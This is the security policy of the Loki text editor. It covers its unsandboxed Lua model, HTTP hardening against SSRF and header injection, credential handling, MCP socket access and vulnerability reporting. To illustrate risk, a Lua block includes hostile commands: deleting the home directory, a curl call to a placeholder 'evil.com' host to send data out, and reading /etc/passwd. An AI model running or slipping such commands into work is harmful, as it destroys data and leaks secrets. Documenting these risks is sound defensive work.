# Security Policy

## Table of Contents

- [Security Model Overview](#security-model-overview)
- [Lua Security Model](#lua-security-model)
- [HTTP Security](#http-security)
- [File System Security](#file-system-security)
- [Best Practices](#best-practices)
- [Known Limitations](#known-limitations)
- [Reporting Vulnerabilities](#reporting-vulnerabilities)

---

## Security Model Overview

### Trust Boundaries

Loki is a **single-user text editor** designed to run on trusted systems with the full privileges of the executing user. The security model assumes:

1. **Trusted Environment**: The system running Loki is under your control
2. **Trusted Configuration**: Lua scripts in `.loki/init.lua` are authored or reviewed by you
3. **Trusted Input**: Files opened in the editor come from trusted sources
4. **User-Level Isolation**: Loki operates within your user account's permissions

### Threat Model

**In Scope:**

- Protection against accidental data corruption
- Defense against malformed file inputs (binary files, extremely long lines)
- Safe handling of network responses
- Prevention of common memory safety issues (buffer overflows, use-after-free)

**Out of Scope:**

- Sandboxing untrusted Lua scripts (by design)
- Protection against malicious system administrators
- Multi-user isolation (Loki is single-user)
- Protection against compromised dependencies (Lua, libcurl)

### Attack Surface

1. **File Input**: Text files opened in the editor
   - Mitigation: Binary file detection, line length limits, bounds checking
2. **Lua Scripts**: Configuration files (`.loki/init.lua`, modules, languages, themes)
   - Mitigation: User review, local-only execution
3. **HTTP Responses**: Async HTTP request responses
   - Mitigation: SSL/TLS verification, timeout limits, size limits
4. **Terminal Input**: Keyboard input and VT100 sequences
   - Mitigation: Input validation, escape sequence filtering

---

## Lua Security Model

### Execution Model

**Loki executes Lua scripts with the full privileges of your user account.** There is **no sandboxing** by design. This is intentional for several reasons:

1. **Simplicity**: No complex sandboxing mechanisms to maintain or bypass
2. **Functionality**: Full access to system APIs enables powerful automation
3. **Trust Model**: You control what scripts run in your editor
4. **Single-User**: Loki is not a multi-user or network service

### Configuration File Trust

Loki loads Lua configuration in this order:

1. **Local project config**: `.loki/init.lua` (current working directory)
2. **Global config**: `~/.loki/init.lua` (home directory)

**Security Implications:**

```lua
-- .loki/init.lua can do ANYTHING your user account can do:
os.execute("rm -rf ~/*")              -- Delete your home directory
io.popen("curl http://evil.com"):read()  -- Send data to remote server
require("socket").tcp():connect()     -- Open network connections
io.open("/etc/passwd"):read("*a")     -- Read sensitive files (if permissions allow)
```

### Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Malicious `.loki/init.lua` in cloned repos | **CRITICAL** | Always review before opening projects |
| Typosquatting in module names | **HIGH** | Verify module sources |
| API key leakage in config files | **HIGH** | Use environment variables, never commit keys |
| Unintended file system operations | **MEDIUM** | Review scripts before execution |

### Safe Configuration Practices

**DO:**

```lua
-- Use environment variables for secrets
local api_key = os.getenv("OPENAI_API_KEY")

-- Validate external inputs
local function safe_insert(text)
    if type(text) ~= "string" or #text > 10000 then
        loki.status("Invalid input")
        return
    end
    loki.insert_text(text)
end

-- Use pcall for error handling
local ok, result = pcall(function()
    return require("untrusted_module")
end)
if not ok then
    loki.status("Failed to load module: " .. result)
end
```

**DON'T:**

```lua
-- Don't hardcode credentials
local api_key = "sk-proj-abc123..."  -- NEVER DO THIS

-- Don't execute arbitrary code from files
local code = io.open("script.lua"):read("*a")
loadstring(code)()  -- DANGEROUS

-- Don't trust user input without validation
function on_http_response(response)
    loadstring(response.body)()  -- NEVER DO THIS
end
```

### Module Security

When using third-party modules:

1. **Review Source Code**: Always read modules before using them
2. **Check Origins**: Prefer modules from known, trusted authors
3. **Pin Versions**: Don't auto-update without reviewing changes
4. **Isolate Risk**: Use separate config files for experimental modules

**Example Safe Module Loading:**

```lua
-- Check if module file exists and is readable
local function safe_require(module_path)
    local f = io.open(module_path, "r")
    if not f then
        loki.status("Module not found: " .. module_path)
        return nil
    end

    -- Check file size (prevent loading huge files)
    local size = f:seek("end")
    f:close()

    if size > 100000 then  -- 100KB limit
        loki.status("Module too large: " .. module_path)
        return nil
    end

    -- Load with pcall for error handling
    local ok, module = pcall(dofile, module_path)
    if not ok then
        loki.status("Failed to load: " .. module)
        return nil
    end

    return module
end
```

---

## HTTP Security

### Async HTTP Requests

Loki can make HTTP requests via `loki.async_http()`. HTTP support is off by default; build with `-DLOKI_ENABLE_HTTP=ON`. Limits are compile-time constants in `src/http.h`.

**Transport Security:**

- libcurl with TLS peer and host verification enabled
- Certificates checked against the system CA bundle

**Resource Limits:**

- 60-second request timeout, 10-second connect timeout
- 10 pending requests at most
- 10MB response limit; a larger response aborts the transfer
- 5MB request body limit
- 5 redirects at most, restricted to `http` and `https`

**URL Validation:**

- Only `http://` and `https://` schemes
- 2048-character length limit
- Control characters rejected
- Internal hosts rejected, both in the URL and at connect time (see [Threat Model](#threat-model))

**Rate Limiting:**

- 60 requests per fixed 60-second window, process-wide

**Header Validation:**

- 100 headers at most, 1KB each, 8KB in total
- Each header must be `Name: value`, with a name of letters, digits, `-` and `_`
- Control characters rejected, including CR, LF and tab

An embedded NUL in the URL, body or a header is rejected. C would otherwise see only the part before it.

### SSL/TLS Verification

By default, libcurl verifies SSL certificates. **Never disable verification** unless you have a specific, understood reason.

```lua
-- GOOD: Uses HTTPS with certificate verification
loki.async_http(
    "https://api.openai.com/v1/chat/completions",
    "POST",
    json_body,
    {"Authorization: Bearer " .. api_key},
    "response_handler"
)

-- BAD: Uses HTTP (unencrypted)
loki.async_http(
    "http://api.openai.com/...",  -- INSECURE
    "POST",
    json_body,
    {"Authorization: Bearer " .. api_key},  -- Exposed to network sniffing
    "response_handler"
)
```

### Credential Management

**Best Practices:**

1. **Environment Variables**: Store API keys in environment variables

   ```lua
   local api_key = os.getenv("OPENAI_API_KEY")
   if not api_key then
       loki.status("Error: OPENAI_API_KEY not set")
       return
   end
   ```

2. **Never Commit Secrets**: Use `.gitignore` for config files with credentials

   ```gitignore
   # .gitignore
   .loki/secrets.lua
   .loki/api_keys.lua
   ```

3. **Separate Files**: Keep secrets in separate, local-only files

   ```lua
   -- .loki/init.lua (version controlled)
   local secrets = dofile(os.getenv("HOME") .. "/.loki/secrets.lua")

   -- ~/.loki/secrets.lua (NOT version controlled)
   return {
       openai_key = "sk-proj-...",
       anthropic_key = "sk-ant-..."
   }
   ```

4. **Restricted Permissions**: Protect secret files

   ```bash
   chmod 600 ~/.loki/secrets.lua
   ```

### Request Validation

Always validate HTTP responses before processing:

```lua
function http_response_handler(response)
    -- Check for nil response
    if not response then
        loki.status("Error: No response received")
        return
    end

    -- Check for network errors
    if response.error then
        loki.status("HTTP Error: " .. response.error)
        return
    end

    -- Check HTTP status code
    if response.status ~= 200 then
        loki.status(string.format("HTTP %d error", response.status))
        return
    end

    -- Validate response body exists
    if not response.body or #response.body == 0 then
        loki.status("Error: Empty response")
        return
    end

    -- Validate response size (prevent DoS via huge responses)
    if #response.body > 1000000 then  -- 1MB limit
        loki.status("Error: Response too large")
        return
    end

    -- Parse JSON safely
    local ok, parsed = pcall(parse_json, response.body)
    if not ok then
        loki.status("Error: Invalid JSON response")
        return
    end

    -- Use the response
    process_response(parsed)
end
```

### Understanding Security Limits

`loki.async_http()` returns `nil` and a message when it rejects a request:

| Check | Message |
|-------|---------|
| URL scheme, length, control characters | `URL must use http:// or https://`, `URL too long (max 2048)`, `URL contains invalid characters` |
| Internal host | `URL points at an internal address` |
| Embedded NUL | `URL contains a NUL byte`, `Request body contains a NUL byte`, `Header contains a NUL byte` |
| Body over 5MB | `Request body too large` |
| Headers | `Too many headers (max 100)`, `Headers too large (max 8192 bytes)`, or the header format error |
| Rate limit | `Rate limit exceeded` |
| 10 requests already pending | `Too many pending requests` |

The rate-limit and pending-request messages also appear in the status bar.

A response over 10MB, a refused internal connection, or any other transfer failure reaches the callback as `response.error`, with `response.status` set to 0. An HTTP status of 400 or above sets `response.error` to `HTTP error <code>`.

### Handling Security Errors

```lua
function make_api_request(url, body)
    local request_id, err = loki.async_http(url, "POST", body, {}, "api_callback")

    if not request_id then
        -- Rejected before sending; err says why
        loki.status("HTTP request rejected: " .. err)
        return false
    end

    return true
end

function api_callback(response)
    if response.error then
        -- Transfer failure, refused connection, or HTTP status >= 400
        loki.status("HTTP Error: " .. response.error)
        return
    end

    -- Process successful response
    process_response(response)
end
```

### Network Security Checklist

- [ ] Use HTTPS for all sensitive communications
- [ ] Store API keys in environment variables or `~/.loki/secrets.lua`
- [ ] Never commit credentials to version control
- [ ] Validate all HTTP responses before processing
- [ ] Stay within rate limits (60 requests/minute)
- [ ] Keep request bodies under 5MB
- [ ] Keep URLs under 2KB
- [ ] Use timeouts to prevent indefinite hangs
- [ ] Log errors without exposing sensitive data

### HTTP Security Hardening

Implementation: `src/http.c`. Limits: `src/http.h`.

#### Threat Model

| Threat | Attack Vector | Mitigation | Severity |
|--------|---------------|------------|----------|
| SSRF (Server-Side Request Forgery) | `file://`, `ftp://`, `gopher://` schemes | URL scheme validation | **CRITICAL** |
| SSRF to internal hosts | Internal address literals, names resolving to internal addresses, redirects | URL host check, plus a connect-time address check on every connection | **CRITICAL** |
| DoS (Denial of Service) | Request flooding | Rate limiting (60/min) | **HIGH** |
| Memory exhaustion | Large request bodies | 5MB request body limit | **HIGH** |
| Memory exhaustion | Large response bodies | 10MB response limit | **HIGH** |
| Header injection | Malicious headers with `\r\n` | Control character filtering | **MEDIUM** |
| URL injection | Control characters | Control character filtering | **MEDIUM** |
| Resource exhaustion | Too many concurrent requests | 10 pending request limit | **MEDIUM** |

Internal addresses are loopback, RFC1918, link-local (including `169.254.169.254`), CGNAT `100.64.0.0/10`, multicast, reserved, and IPv6 equivalents including IPv4-mapped forms. `LOKI_HTTP_ALLOW_INTERNAL` disables both checks. With an HTTP proxy configured, the connect-time check sees the proxy address: a loopback proxy needs `LOKI_HTTP_ALLOW_INTERNAL`, and a remote proxy resolves the destination itself, so the check cannot apply.

#### Security Layers

Checks run in this order. Each one rejects the request before any network I/O.

1. `lua_loki_async_http()`: `loki_http_validate_url()`, body size, then each header through `loki_http_validate_header()` and the count and total-size limits.
2. `loki_http_request()`: URL and body again (for C callers), `check_rate_limit()`, then the pending-request limit.
3. curl options: TLS verification, timeouts, redirect limit and protocols, and `open_socket_callback()`, which refuses internal addresses on every connection.
4. `write_callback()`: aborts the transfer once the response passes 10MB.

#### Configuration Constants

```c
/* src/http.h */
#define LOKI_HTTP_MAX_ASYNC_REQUESTS  10
#define LOKI_HTTP_MAX_RESPONSE_SIZE   (10 * 1024 * 1024)  /* 10MB */
#define LOKI_HTTP_MAX_URL_LENGTH      2048
#define LOKI_HTTP_MAX_BODY_SIZE       (5 * 1024 * 1024)   /* 5MB */
#define LOKI_HTTP_MAX_HEADERS         100
#define LOKI_HTTP_MAX_HEADER_SIZE     1024
#define LOKI_HTTP_MAX_HEADERS_TOTAL   8192
#define LOKI_HTTP_MAX_REDIRECTS       5
#define LOKI_HTTP_RATE_LIMIT          60      /* requests per minute */
#define LOKI_HTTP_TIMEOUT             60      /* seconds */
#define LOKI_HTTP_CONNECT_TIMEOUT     10      /* seconds */
```

**Rationale for limits:**

- **URL length (2048)**: Based on browser and server standards (Chrome: 2083, Apache: 8192)
- **Request body (5MB)**: Accommodates large JSON payloads while preventing abuse
- **Response size (10MB)**: Allows API responses with substantial data
- **Headers (8KB)**: Typical web server limit (Nginx: 8KB, Apache: 8KB default)
- **Rate limit (60/min)**: Prevents flooding while allowing burst requests
- **Pending requests (10)**: Balances parallelism with resource usage

#### Testing Security Features

The regression tests are in `tests/test_http_security.c`. Run them with `make test-http`; `make test` builds without HTTP and skips them.

#### Bypassing Security Measures

**WARNING:** Do not attempt to bypass these security measures. They exist to protect against:

- **SSRF attacks**: Reading local files via `file://` URIs, or reaching internal services
- **DoS attacks**: Exhausting editor memory/CPU
- **Injection attacks**: Manipulating HTTP protocol with control characters
- **Resource exhaustion**: Overwhelming the system with requests

**If you need higher limits:**

1. **Modify source code**: Edit constants in `src/http.h` and recompile
2. **Understand risks**: Document why you need higher limits
3. **Test thoroughly**: Ensure your use case doesn't introduce vulnerabilities
4. **Keep SSL/TLS verification enabled**: Never disable certificate validation

`LOKI_HTTP_ALLOW_INTERNAL` is the only runtime override. It permits internal hosts, for example a local model server.

**Example of increasing limits (requires recompilation):**

```c
/* src/http.h */
#define LOKI_HTTP_MAX_BODY_SIZE       (50 * 1024 * 1024)  /* 50MB */
#define LOKI_HTTP_RATE_LIMIT          1000                /* per minute */
```

**Disabling security is strongly discouraged.** If limits are insufficient for your use case, consider:

- Using external tools (`curl`, `wget`) via `os.execute()`
- Implementing custom C extension with appropriate security controls
- Splitting large requests into smaller chunks

---

## Agent Integration (MCP)

`:mcp` listens on a Unix socket, so other processes can read and edit buffers.

- **Who can connect:** the socket's directory must be owned by the user and have no group or other permissions. `loki.listen` creates it with mode 0700 and refuses an existing directory that fails these checks. A directory pre-created in `/tmp` by another user is refused, so only the user and root can connect.
- **What a client can do:**
  - read every open buffer;
  - replace text in open buffers inside the start directory;
  - open files inside that directory.

  Paths are resolved without symlinks before the check. A missing file resolves through its parent directory, and a final `..` is rejected.
- **What it cannot do:** save files or run Lua; no tool does either. Edits are undoable and unsaved until the user runs `:w`.
- **Limits:** 8 connections, 16 MB of queued output per connection, 64 MB per message line.

An agent typically has its own file and shell tools. The MCP server does not confine it.

## File System Security

### File Access Permissions

Loki operates with the permissions of your user account. It can:

- Read any file you can read
- Write any file you can write
- Execute any command you can execute (via `os.execute()` in Lua)

**Mitigation**: Run Loki under a dedicated user account with restricted permissions if working with untrusted files.

### Binary File Protection

Loki detects and rejects binary files to prevent:

- Display corruption from null bytes and control characters
- Potential buffer overflows from malformed data
- Accidental modification of executable files

**Implementation** (`editor_open()` in `src/core.c`): a NUL byte in the first 1KB rejects the file with `Cannot open binary file`.

### Path Traversal

Loki does not currently validate file paths. Lua scripts can access arbitrary paths:

```lua
-- Lua scripts can read/write any file the user can access
local f = io.open("/etc/passwd", "r")
local f = io.open("../../../../etc/passwd", "r")  -- Path traversal
```

**Mitigation**: Only open files from trusted directories. Consider using absolute paths and validating them.

### Temporary Files

Loki creates temporary files in `/tmp` during testing. These files:

- Are created with default umask (typically 0022, world-readable)
- May persist if tests crash
- Could expose sensitive data if file contains secrets

**Best Practice**: Avoid editing files with secrets. Use environment variables instead.

---

## Best Practices

### For Users

1. **Review Configuration Files**
   - Always inspect `.loki/init.lua` in new projects before opening
   - Treat config files as executable code (because they are)
   - Use `less .loki/init.lua` before opening the editor

2. **Secure Credentials**

   ```bash
   # Store API keys in environment, not config files
   export OPENAI_API_KEY="sk-proj-..."
   export ANTHROPIC_API_KEY="sk-ant-..."

   # Add to ~/.bashrc or ~/.zshrc, never commit
   ```

3. **Use HTTPS**
   - Always use HTTPS URLs for API requests
   - Verify SSL certificates (default behavior)

4. **Limit Privileges**
   - Don't run Loki as root
   - Use dedicated user accounts for working with untrusted files

5. **Keep Dependencies Updated**

   ```bash
   # Update system packages regularly
   brew update && brew upgrade  # macOS
   apt update && apt upgrade    # Ubuntu/Debian
   ```

### For Developers

1. **Memory Safety**
   - Always check malloc/realloc return values
   - Validate array bounds before access
   - Free allocated memory in all code paths
   - Use AddressSanitizer during development:

     ```bash
     cmake -B build -DCMAKE_C_FLAGS="-fsanitize=address -g"
     make -C build
     ```

2. **Input Validation**
   - Check all file inputs for expected format
   - Validate HTTP response sizes and content
   - Sanitize terminal escape sequences

3. **Error Handling**
   - Use `pcall()` in Lua for error isolation
   - Check return values from C functions
   - Never ignore errors silently

4. **Code Review**
   - Review all PRs for security implications
   - Run static analysis tools (clang-tidy, cppcheck)
   - Test with fuzzing tools (AFL, libFuzzer)

5. **Testing**

   ```bash
   # Run tests with memory checking
   make test

   # Run with Valgrind for leak detection
   valgrind --leak-check=full ./build/test_core

   # Run with AddressSanitizer
   ASAN_OPTIONS=detect_leaks=1 ./build/test_core
   ```

---

## Known Limitations

### 1. No Lua Sandboxing

**Impact**: Malicious Lua scripts can compromise your system

**Mitigation**: Only load trusted configuration files

**Status**: By design (will not change)

### 2. Credentials in Configuration Files

**Impact**: Hardcoded API keys may be exposed via version control

**Mitigation**: Use environment variables, add `.loki/secrets.lua` to `.gitignore`

**Status**: User responsibility

### 3. Path Traversal in Lua Scripts

**Impact**: Lua scripts can access arbitrary file system paths

**Mitigation**: Only open projects from trusted sources

**Status**: By design (Lua has full file system access)

### 4. No Multi-User Isolation

**Impact**: Loki is designed for single-user systems only

**Mitigation**: Don't use Loki in multi-user or server environments

**Status**: Out of scope

### 5. Temporary File Permissions

**Impact**: Test files in `/tmp` may be world-readable

**Mitigation**: Don't edit sensitive data in tests

**Status**: Low priority (test-only issue)

---

## Reporting Vulnerabilities

### Scope

We take security seriously for **memory safety**, **file handling**, and **network security** issues.

**In Scope:**

- Memory safety vulnerabilities (buffer overflows, use-after-free, null pointer dereferences)
- File parsing vulnerabilities (malformed inputs causing crashes)
- HTTP security issues (SSL/TLS handling, credential leakage)
- Binary file detection bypasses

**Out of Scope:**

- Lua script execution (by design, scripts have full access)
- Path traversal in Lua (by design, Lua has file system access)
- Social engineering attacks (tricking users into running malicious configs)
- Vulnerabilities in dependencies (report to upstream: Lua, libcurl, OpenSSL)

### How to Report

**For security vulnerabilities:**

1. **DO NOT** open a public GitHub issue
2. Email: `sa@example.com` (replace with your email)
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Proof of concept (if available)
   - Suggested fix (if you have one)

**Response Timeline:**

- **Acknowledgment**: Within 48 hours
- **Initial Assessment**: Within 7 days
- **Fix Timeline**: Depends on severity
  - Critical: 7-14 days
  - High: 14-30 days
  - Medium/Low: Next release cycle

### Recognition

Security researchers who report valid vulnerabilities will be:

- Credited in release notes (if desired)
- Listed in SECURITY.md acknowledgments
- Thanked publicly (with permission)

---

## Security Acknowledgments

We thank the following researchers for responsible disclosure:

*(None yet - be the first!)*

---

## Additional Resources

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [Lua Security Best Practices](https://www.lua.org/pil/8.4.html)
- [libcurl Security](https://curl.se/docs/security.html)

---

**Last Updated**: 2026-10-25
**Version**: 1.0
